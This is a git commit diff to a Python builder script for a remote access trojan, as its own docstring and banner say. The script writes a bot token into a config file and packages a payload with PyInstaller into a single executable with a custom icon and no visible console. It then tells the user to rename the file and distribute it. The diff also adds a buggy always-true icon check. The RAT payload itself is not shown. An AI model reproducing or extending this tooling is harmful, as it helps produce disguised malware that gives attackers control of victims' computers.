572d1aeef299c47aef902422a038072405d430d3
zernn <makszarkij99@gmail.com>
2025-02-23 14:14:50 +0300

    alpha1.3

--- bilder.py
+++ bilder.py
@@ -1,4 +1,5 @@
 import time
+from colorama import Fore
 import subprocess
 
 """
@@ -6,13 +7,23 @@ US TO FAST BILD YOUR RAT
 """
 
 commands = ['pyinstaller', '--onefile']
-enters = '-_-_' * 16
+enters = Fore.RED + '-_-_' * 16
+
+print(Fore.RED +
+    '''
+   __    _   _____     ___   _____  __    ___  __  __  
+  /__\  /_\ /__   \   / __\  \_   \/ /   /   \/__\/__\ 
+ / \// //_\\  / /\/  /__\//   / /\/ /   / /\ /_\ / \// 
+/ _  \/  _  \/ /    / \/  \/\/ /_/ /___/ /_///__/ _  \ 
+\/ \_/\_/ \_/\/     \_____/\____/\____/___,'\__/\/ \_/ 
+    '''
+)
 
 def set_bot(token):
     with open('config.py', 'w') as f:
         f.write(f"TOKEN = '{token}'\n")
 
-def create_exe(command : list, file_path: str, icon='--icon=icon.ico', console='--noconsole'):
+def create_exe(command : list, file_path: str, icon='--icon=icon1.ico', console='--noconsole'):
     try:
         time.sleep(1)
         command.append(icon)
@@ -26,10 +37,10 @@ def create_exe(command : list, file_path: str, icon='--icon=icon.ico', console='
             subprocess.run(command, check=True)
 
         print(enters)
-        print(f'Succeful bilding: your file in /dist/{file_path}\n Rename and go to us!')
+        print(Fore.GREEN + f'Succeful bilding: your file in /dist/{file_path}\n Rename and go to us!')
         print(enters)
     except Exception as e:
-        print(f'Error bilding: {e}')
+        print(Fore.RED + f'Error bilding: {e}')
         print(enters)
 
     finally:
@@ -41,13 +52,13 @@ def create_exe(command : list, file_path: str, icon='--icon=icon.ico', console='
 if __name__=="__main__":
     while True:
         try:
-            token = input('Enter your bot-token --> ')
+            token = input(Fore.BLUE + 'Enter your bot-token --> ')
             set_bot(token=token)
 
-            file = input('Enter run file name(default: run.py) --> ')
-            icon = input('Enter name icon(youricon.ico) default icon: y --> ')
-            con = input('Console? y/n if you want to hide the console at startup: n --> ').lower()
-            if icon == 'y':
+            file = input(Fore.BLUE + 'Enter run file name(default: run.py) --> ')
+            icon = input(Fore.BLUE + 'Enter name icon(youricon.ico) default icon: y --> ')
+            con = input(Fore.BLUE + 'Console? y/n if you want to hide the console at startup: n --> ').lower()
+            if icon == 'y' or 'Y':
                 if con == 'y':
                     create_exe(commands, file, console=False)
                 else:
@@ -58,5 +69,5 @@ if __name__=="__main__":
                 else:
                     create_exe(commands, file, icon)
         except Exception as e:
-            print(f'error: {e}')
+            print(Fore.RED + f'error: {e}')
             print(enters)
